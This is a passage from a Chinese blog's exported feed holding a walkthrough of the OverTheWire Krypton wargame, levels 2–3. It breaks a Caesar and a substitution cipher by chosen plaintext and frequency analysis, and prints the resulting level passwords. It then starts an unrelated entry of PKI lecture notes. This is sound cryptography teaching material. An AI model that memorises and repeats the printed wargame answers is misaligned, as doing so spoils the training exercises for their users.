class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">HOHAGHYGFAY</span></span><br><span class="line"><span class="symbol">IPIBHIZHGBZ</span></span><br><span class="line"><span class="symbol">JQJCIJAIHCA</span></span><br><span class="line"><span class="symbol">KRKDJKBJIDB</span></span><br><span class="line"><span class="keyword">LSLEKLCKJEC</span></span><br><span class="line"><span class="keyword">MTMFLMDLKFD</span></span><br><span class="line"><span class="keyword">NUNGMNEMLGE</span></span><br><span class="line"><span class="keyword">OVOHNOFNMHF</span></span><br><span class="line"><span class="keyword">PWPIOPGONIG</span></span><br><span class="line"><span class="keyword">QXQJPQHPOJH</span></span><br><span class="line"><span class="keyword">RYRKQRIQPKI</span></span><br><span class="line"><span class="keyword">SZSLRSJRQLJ</span></span><br><span class="line"><span class="keyword">TATMSTKSRMK</span></span><br><span class="line"><span class="keyword">UBUNTULTSNL</span></span><br><span class="line"><span class="keyword">VCVOUVMUTOM</span></span><br><span class="line"><span class="keyword">WDWPVWNVUPN</span></span><br><span class="line"><span class="keyword">XEXQWXOWVQO</span></span><br><span class="line"><span class="keyword">YFYRXYPXWRP</span></span><br><span class="line"><span class="keyword">ZGZSYZQYXSQ</span></span><br><span class="line"><span class="keyword">AHATZARZYTR</span></span><br><span class="line"><span class="keyword">BIBUABSAZUS</span></span><br><span class="line"><span class="keyword">CJCVBCTBAVT</span></span><br><span class="line"><span class="keyword">DKDWCDUCBWU</span></span><br><span class="line"><span class="keyword">ELEXDEVDCXV</span></span><br><span class="line"><span class="keyword">FMFYEFWEDYW</span></span><br><span class="line"><span class="keyword">GNGZFGXFEZX</span></span><br></pre></td></tr></table></figure><p>发现果然好像没有可读的，再看看README原来这是个示例（我好蠢</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat /etc/issue</span><br><span class="line">Ubuntu 14.04.5 LTS \n \l</span><br><span class="line"></span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls  /krypton/krypton2/krypton3 </span><br><span class="line">/krypton/krypton2/krypton3</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls  /krypton/krypton2/ -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 root     root     4096 Nov  4 05:21 .</span><br><span class="line">drwxr-xr-x 8 root     root     4096 Nov  4 05:21 ..</span><br><span class="line">-rw-r----- 1 krypton2 krypton2 1815 Nov  4 05:21 README</span><br><span class="line">-rwsr-x--- 1 krypton3 krypton2 8970 Nov  4 05:21 encrypt</span><br><span class="line">-rw-r----- 1 krypton3 krypton3   27 Nov  4 05:21 keyfile.dat</span><br><span class="line">-rw-r----- 1 krypton2 krypton2   13 Nov  4 05:21 krypton3</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls</span><br><span class="line">ciphertext  keyfile.dat</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ rm -f ciphertext </span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /krypton/krypton2/krypton3 </span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls</span><br><span class="line">ciphertext  keyfile.dat</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext </span><br><span class="line">AYCQYPGQCYQW</span><br><span class="line">krypton2@krypton:/tmp/tmp.fz9I1hQd5d$</span><br></pre></td></tr></table></figure><p>重新用krypton3被加载，解密，得到<code>CAESARISEASY</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BZDRZQHRDZRX</span></span><br><span class="line"><span class="keyword">CAESARISEASY</span></span><br><span class="line"><span class="keyword">DBFTBSJTFBTZ</span></span><br><span class="line"><span class="keyword">ECGUCTKUGCUA</span></span><br><span class="line"><span class="keyword">FDHVDULVHDVB</span></span><br><span class="line"><span class="keyword">GEIWEVMWIEWC</span></span><br><span class="line"><span class="keyword">HFJXFWNXJFXD</span></span><br><span class="line"><span class="keyword">IGKYGXOYKGYE</span></span><br><span class="line"><span class="keyword">JHLZHYPZLHZF</span></span><br><span class="line"><span class="keyword">KIMAIZQAMIAG</span></span><br><span class="line"><span class="keyword">LJNBJARBNJBH</span></span><br><span class="line"><span class="keyword">MKOCKBSCOKCI</span></span><br><span class="line"><span class="keyword">NLPDLCTDPLDJ</span></span><br><span class="line"><span class="keyword">OMQEMDUEQMEK</span></span><br><span class="line"><span class="keyword">PNRFNEVFRNFL</span></span><br><span class="line"><span class="keyword">QOSGOFWGSOGM</span></span><br><span class="line"><span class="keyword">RPTHPGXHTPHN</span></span><br><span class="line"><span class="keyword">SQUIQHYIUQIO</span></span><br><span class="line"><span class="keyword">TRVJRIZJVRJP</span></span><br><span class="line"><span class="keyword">USWKSJAKWSKQ</span></span><br><span class="line"><span class="keyword">VTXLTKBLXTLR</span></span><br><span class="line"><span class="keyword">WUYMULCMYUMS</span></span><br><span class="line"><span class="keyword">XVZNVMDNZVNT</span></span><br><span class="line"><span class="keyword">YWAOWNEOAWOU</span></span><br><span class="line"><span class="keyword">ZXBPXOFPBXPV</span></span><br><span class="line"><span class="keyword">AYCQYPGQCYQW</span></span><br></pre></td></tr></table></figure><p>得到flag进入下一关</p><h3 id="level-3-1"><a href="#level-3-1" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">krypton3@krypton:~$ ls</span><br><span class="line">krypton3@krypton:~$ <span class="built_in">cd</span> /krypton/krypton3</span><br><span class="line">krypton3@krypton:/krypton/krypton3$ ls</span><br><span class="line">HINT1  HINT2  README  found1  found2  found3  krypton4</span><br><span class="line">krypton3@krypton:/krypton/krypton3$ cat README </span><br><span class="line">Well <span class="keyword">done</span>.  You<span class="string">'ve moved past an easy substitution cipher.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hopefully you just encrypted the alphabet a plaintext </span></span><br><span class="line"><span class="string">to fully expose the key in one swoop.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The main weakness of a simple substitution cipher is </span></span><br><span class="line"><span class="string">repeated use of a simple key.  In the previous exercise</span></span><br><span class="line"><span class="string">you were able to introduce arbitrary plaintext to expose</span></span><br><span class="line"><span class="string">the key.  In this example, the cipher mechanism is not </span></span><br><span class="line"><span class="string">available to you, the attacker.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">However, you have been lucky.  You have intercepted more</span></span><br><span class="line"><span class="string">than one message.  The password to the next level is found</span></span><br><span class="line"><span class="string">in the file '</span>krypton4<span class="string">'.  You have also found 3 other files.</span></span><br><span class="line"><span class="string">(found1, found2, found3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You know the following important details:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- The message plaintexts are in English (*** very important)</span></span><br><span class="line"><span class="string">- They were produced from the same key (*** even better!)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enjoy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$ cat found1</span></span><br><span class="line"><span class="string">CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU krypton3@krypton:/krypton/krypton3$ cat found2</span></span><br><span class="line"><span class="string">QVJDB MEDGB QJJSG WQGZS NSZBN WUXBN JDSYS NCBWU MNICI STBUJ ACBEN QYDSN UQENS SJDQJ UDQFS UYSQN SKQUS WMZQJ SWQJJ DSFCG EUGSK UZDBB VCGUJ NQJXB NWQXN SSUZD BBVZD QNJSN SWCGQ ABMJQ HMQNJ SNBXQ TCVSX NBTDC UDBTS ENQTT QNUZD BBVUI QNCSW CGHMQ VCJLW MNCGE JDSSV CPQAS JDQGS NQAMJ JDSZM NNCZM VMTKQ UWCZJ QJSWA LVQKJ DNBME DBMJS GEVQG WQGWJ DSUZD BBVKB MVWDQ ISYNB ICWSW QGCGJ SGUCI SSWMZ QJCBG CGVQJ CGENQ TTQNQ GWJDS ZVQUU CZUQJ JDSQE SBXUD QFSUY SQNST QNNCS WJDSL SQNBV WQGGS DQJDQ KQLJD SZBGU CUJBN LZBMN JBXJD SWCBZ SUSBX KBNZS UJSNC UUMSW QTQNN CQESV CZSGZ SBGGB ISTAS NJKBB XDQJD QKQLU GSCED ABMNU YBUJS WABGW UJDSG SOJWQ LQUUM NSJLJ DQJJD SNSKS NSGBC TYSWC TSGJU JBJDS TQNNC QESJD SZBMY VSTQL DQISQ NNQGE SWJDS ZSNST BGLCG UBTSD QUJSU CGZSJ DSKBN ZSUJS NZDQG ZSVVB NQVVB KSWJD STQNN CQESA QGGUJ BASNS QWBGZ SCGUJ SQWBX JDSMU MQVJD NSSJC TSUQG GSUYN SEGQG ZLZBM VWDQI SASSG JDSNS QUBGX BNJDC UUCOT BGJDU QXJSN JDSTQ NNCQE SUDSE QISAC NJDJB QWQME DJSNU MUQGG QKDBK QUAQY JCUSW BGTQL JKCGU UBGDQ TGSJQ GWWQM EDJSN RMWCJ DXBVV BKSWQ VTBUJ JKBLS QNUVQ JSNQG WKSNS AQYJC USWBG XSANM QNLDQ TGSJW CSWBX MGFGB KGZQM USUQJ JDSQE SBXQG WKQUA MNCSW BGQME MUJQX JSNJD SACNJ DBXJD SJKCG UJDSN SQNSX SKDCU JBNCZ QVJNQ ZSUBX UDQFS UYSQN SMGJC VDSCU TSGJC BGSWQ UYQNJ BXJDS VBGWB GJDSQ JNSUZ SGSCG ASZQM USBXJ DCUEQ YUZDB VQNUN SXSNJ BJDSL SQNUA SJKSS GQGWQ UUDQF SUYSQ NSUVB UJLSQ NUACB ENQYD SNUQJ JSTYJ CGEJB QZZBM GJXBN JDCUY SNCBW DQISN SYBNJ SWTQG LQYBZ NLYDQ VUJBN CSUGC ZDBVQ UNBKS UDQFS UYSQN SUXCN UJACB ENQYD SNNSZ BMGJS WQUJN QJXBN WVSES GWJDQ JUDQF SUYSQ NSXVS WJDSJ BKGXB NVBGW BGJBS UZQYS YNBUS ZMJCB GXBNW SSNYB QZDCG EQGBJ DSNSC EDJSS GJDZS GJMNL UJBNL DQUUD QFSUY SQNSU JQNJC GEDCU JDSQJ NCZQV ZQNSS NTCGW CGEJD SDBNU SUBXJ DSQJN SYQJN BGUCG VBGWB GRBDG QMANS LNSYB NJSWJ DQJUD QFSUY SQNSD QWASS GQZBM GJNLU ZDBBV TQUJS NUBTS JKSGJ CSJDZ SGJMN LUZDB VQNUD QISUM EESUJ SWJDQ JUDQF SUYSQ NSTQL DQISA SSGST YVBLS WQUQU ZDBBV TQUJS NALQV SOQGW SNDBE DJBGB XVQGZ QUDCN SQZQJ DBVCZ VQGWB KGSNK DBGQT SWQZS NJQCG KCVVC QTUDQ FSUDQ XJSCG DCUKC VVGBS ICWSG ZSUMA UJQGJ CQJSU UMZDU JBNCS UBJDS NJDQG DSQNU QLZBV VSZJS WQXJS NDCUW SQJD</span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$ cat found3 </span></span><br><span class="line"><span class="string">DSNSM YBGVS ENQGW QNBUS KCJDQ ENQIS QGWUJ QJSVL QCNQG WANBM EDJTS JDSAS SJVSX NBTQE VQUUZ QUSCG KDCZD CJKQU SGZVB USWCJ KQUQA SQMJC XMVUZ QNQAQ SMUQG WQJJD QJJCT SMGFG BKGJB GQJMN QVCUJ UBXZB MNUSQ ENSQJ YNCPS CGQUZ CSGJC XCZYB CGJBX ICSKJ DSNSK SNSJK BNBMG WAVQZ FUYBJ UGSQN BGSSO JNSTC JLBXJ DSAQZ FQGWQ VBGEB GSGSQ NJDSB JDSNJ DSUZQ VSUKS NSSOZ SSWCG EVLDQ NWQGW EVBUU LKCJD QVVJD SQYYS QNQGZ SBXAM NGCUD SWEBV WJDSK SCEDJ BXJDS CGUSZ JKQUI SNLNS TQNFQ AVSQG WJQFC GEQVV JDCGE UCGJB ZBGUC WSNQJ CBGCZ BMVWD QNWVL AVQTS RMYCJ SNXBN DCUBY CGCBG NSUYS ZJCGE CJ</span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$ cat HINT1</span></span><br><span class="line"><span class="string">Some letters are more prevalent in English than others.</span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$ cat HINT2</span></span><br><span class="line"><span class="string">"Frequency Analysis" is your friend.</span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$ </span></span><br><span class="line"><span class="string">krypton3@krypton:/krypton/krypton3$</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.jianshu.com/p/a131136c0dbf" target="_blank" rel="noopener">https://www.jianshu.com/p/a131136c0dbf</a></p></blockquote><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 25char</span></span><br><span class="line"><span class="attribute">257</span>: (space)</span><br><span class="line"><span class="attribute">155</span>: S</span><br><span class="line"><span class="attribute">107</span>: C</span><br><span class="line"><span class="attribute">106</span>: Q</span><br><span class="line"><span class="attribute">102</span>: J</span><br><span class="line"><span class="attribute">100</span>: U</span><br><span class="line"><span class="attribute">87</span>: B</span><br><span class="line"><span class="attribute">81</span>: G</span><br><span class="line"><span class="attribute">74</span>: N</span><br><span class="line"><span class="attribute">69</span>: D</span><br><span class="line"><span class="attribute">57</span>: Z</span><br><span class="line"><span class="attribute">56</span>: V</span><br><span class="line"><span class="attribute">47</span>: W</span><br><span class="line"><span class="attribute">42</span>: Y</span><br><span class="line"><span class="attribute">32</span>: T</span><br><span class="line"><span class="attribute">29</span>: X</span><br><span class="line"><span class="attribute">29</span>: M</span><br><span class="line"><span class="attribute">27</span>: L</span><br><span class="line"><span class="attribute">25</span>: K</span><br><span class="line"><span class="attribute">20</span>: A</span><br><span class="line"><span class="attribute">17</span>: E</span><br><span class="line"><span class="attribute">11</span>: F</span><br><span class="line"><span class="attribute">7</span>: O</span><br><span class="line"><span class="attribute">2</span>: I</span><br><span class="line"><span class="attribute">2</span>: H</span><br><span class="line"><span class="attribute">1</span>: R</span><br></pre></td></tr></table></figure><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 26char</span></span><br><span class="line"><span class="attribute">354</span>: (space)</span><br><span class="line"><span class="attribute">243</span>: S</span><br><span class="line"><span class="attribute">186</span>: Q</span><br><span class="line"><span class="attribute">158</span>: J</span><br><span class="line"><span class="attribute">135</span>: N</span><br><span class="line"><span class="attribute">130</span>: U</span><br><span class="line"><span class="attribute">129</span>: B</span><br><span class="line"><span class="attribute">119</span>: D</span><br><span class="line"><span class="attribute">111</span>: G</span><br><span class="line"><span class="attribute">86</span>: C</span><br><span class="line"><span class="attribute">66</span>: W</span><br><span class="line"><span class="attribute">59</span>: Z</span><br><span class="line"><span class="attribute">53</span>: V</span><br><span class="line"><span class="attribute">45</span>: M</span><br><span class="line"><span class="attribute">37</span>: T</span><br><span class="line"><span class="attribute">34</span>: E</span><br><span class="line"><span class="attribute">33</span>: Y</span><br><span class="line"><span class="attribute">33</span>: X</span><br><span class="line"><span class="attribute">30</span>: K</span><br><span class="line"><span class="attribute">27</span>: L</span><br><span class="line"><span class="attribute">26</span>: A</span><br><span class="line"><span class="attribute">14</span>: I</span><br><span class="line"><span class="attribute">12</span>: F</span><br><span class="line"><span class="attribute">3</span>: O</span><br><span class="line"><span class="attribute">2</span>: R</span><br><span class="line"><span class="attribute">2</span>: H</span><br><span class="line"><span class="attribute">1</span>: P</span><br></pre></td></tr></table></figure><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 25char</span></span><br><span class="line"><span class="attribute">93</span>: (space)</span><br><span class="line"><span class="attribute">58</span>: S</span><br><span class="line"><span class="attribute">48</span>: Q</span><br><span class="line"><span class="attribute">41</span>: J</span><br><span class="line"><span class="attribute">35</span>: G</span><br><span class="line"><span class="attribute">34</span>: C</span><br><span class="line"><span class="attribute">31</span>: N</span><br><span class="line"><span class="attribute">30</span>: B</span><br><span class="line"><span class="attribute">27</span>: U</span><br><span class="line"><span class="attribute">22</span>: D</span><br><span class="line"><span class="attribute">21</span>: V</span><br><span class="line"><span class="attribute">16</span>: Z</span><br><span class="line"><span class="attribute">16</span>: W</span><br><span class="line"><span class="attribute">13</span>: E</span><br><span class="line"><span class="attribute">12</span>: M</span><br><span class="line"><span class="attribute">12</span>: K</span><br><span class="line"><span class="attribute">9</span>: Y</span><br><span class="line"><span class="attribute">9</span>: X</span><br><span class="line"><span class="attribute">9</span>: A</span><br><span class="line"><span class="attribute">6</span>: T</span><br><span class="line"><span class="attribute">6</span>: L</span><br><span class="line"><span class="attribute">5</span>: F</span><br><span class="line"><span class="attribute">3</span>: I</span><br><span class="line"><span class="attribute">2</span>: O</span><br><span class="line"><span class="attribute">1</span>: R</span><br><span class="line"><span class="attribute">1</span>: P</span><br></pre></td></tr></table></figure><p>假如把所有综合一起统计</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">703</span>: (space)</span><br><span class="line"><span class="attribute">456</span>: S:e</span><br><span class="line"><span class="attribute">340</span>: Q:t</span><br><span class="line"><span class="attribute">301</span>: J:a</span><br><span class="line"><span class="attribute">257</span>: U:o</span><br><span class="line"><span class="attribute">246</span>: B:i</span><br><span class="line"><span class="attribute">240</span>: N:n</span><br><span class="line"><span class="attribute">227</span>: G:s</span><br><span class="line"><span class="attribute">227</span>: C:h</span><br><span class="line"><span class="attribute">210</span>: D:r</span><br><span class="line"><span class="attribute">132</span>: Z:d</span><br><span class="line"><span class="attribute">130</span>: V:l</span><br><span class="line"><span class="attribute">129</span>: W:c</span><br><span class="line"><span class="attribute">86</span>: M:u</span><br><span class="line"><span class="attribute">84</span>: Y:m</span><br><span class="line"><span class="attribute">75</span>: T:w</span><br><span class="line"><span class="attribute">71</span>: X:f</span><br><span class="line"><span class="attribute">67</span>: K:g</span><br><span class="line"><span class="attribute">64</span>: E:y</span><br><span class="line"><span class="attribute">60</span>: L:p</span><br><span class="line"><span class="attribute">55</span>: A:b</span><br><span class="line"><span class="attribute">28</span>: F:v</span><br><span class="line"><span class="attribute">19</span>: I:k</span><br><span class="line"><span class="attribute">12</span>: O:j</span><br><span class="line"><span class="attribute">4</span>: R:x</span><br><span class="line"><span class="attribute">4</span>: H:q</span><br><span class="line"><span class="attribute">2</span>: P:z</span><br></pre></td></tr></table></figure><p>把上述词频带入解开，貌似也不是密码啊</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">krypton3@krypton:/krypton/krypton3$ cat krypton4 </span><br><span class="line">KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS </span><br><span class="line">gellc isear eleke lfiun mtoog incho bnuae</span><br></pre></td></tr></table></figure><blockquote><p> <a href="http://www.richkni.co.uk/php/crypta/freq.php" target="_blank" rel="noopener">http://www.richkni.co.uk/php/crypta/freq.php</a></p><p> <a href="http://www.simonsingh.net/The_Black_Chamber/hintsandtips.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/hintsandtips.html</a></p></blockquote><p>我疯了，做法没问题，但据说只能一个个试，直接找到了题解</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secret:  A B <span class="keyword">C</span> <span class="keyword">D</span> <span class="keyword">E</span> F G H <span class="keyword">I</span> J <span class="keyword">K</span> L M <span class="keyword">N</span> <span class="keyword">O</span> P Q R S T U V W X Y Z</span><br><span class="line">text:    B <span class="keyword">O</span> <span class="keyword">I</span> H G <span class="keyword">K</span> <span class="keyword">N</span> Q V T W Y U R X Z A J <span class="keyword">E</span> M S L <span class="keyword">D</span> F P <span class="keyword">C</span></span><br></pre></td></tr></table></figure><p>用命令替换得到密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat krypton4 | tr <span class="string">'[A-Z]'</span> <span class="string">'[BOIHGKNQVTWYURXZAJEMSLDFPC]'</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">krypton3@krypton:/krypton/krypton3$  cat krypton4 | tr <span class="string">'[A-Z]'</span> <span class="string">'[BOIHGKNQVTWYURXZAJEMSLDFPC]'</span></span><br><span class="line">WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE </span><br><span class="line">krypton3@krypton:/krypton/krypton3$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wargame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security-Protocols-and-Standards</title>
      <link href="/2020/02/03/Security-Protocols-and-Standards/"/>
      <url>/2020/02/03/Security-Protocols-and-Standards/</url>
      
        <content type="html"><![CDATA[<h1 id="Security-Protocols-and-Standards–PKI-Principles-and-technology"><a href="#Security-Protocols-and-Standards–PKI-Principles-and-technology" class="headerlink" title="Security Protocols and Standards–PKI Principles and technology"></a><center>Security Protocols and Standards</center><br><p align="right">–PKI Principles and technology</p></h1><p><center>安全协议与标准</center></p><ul><li>PKI concepts/content/significance</li><li>Core PKI Service</li><li>Certificate and CRL(证书吊销列表)</li><li>Trust Model</li><li>PKCS：The Public-Key Cryptography Standards</li><li>CA(证书认证中心：Certificate Authority) Standards</li><li>PKI Security Protocols：SMIME，SSL，SET(安全电子交易协议)，VPN</li><li>PKI/CA Design and Implementation</li><li>Related Laws</li><li>* Bitcoin &amp; BlockChain</li></ul><h2 id="1-Review-to-Cryptography"><a href="#1-Review-to-Cryptography" class="headerlink" title="1.Review to Cryptography"></a>1.Review to Cryptography</h2><blockquote><h4 id="Security-Requirment-安全需求"><a href="#Security-Requirment-安全需求" class="headerlink" title="Security Requirment(安全需求)"></a>Security 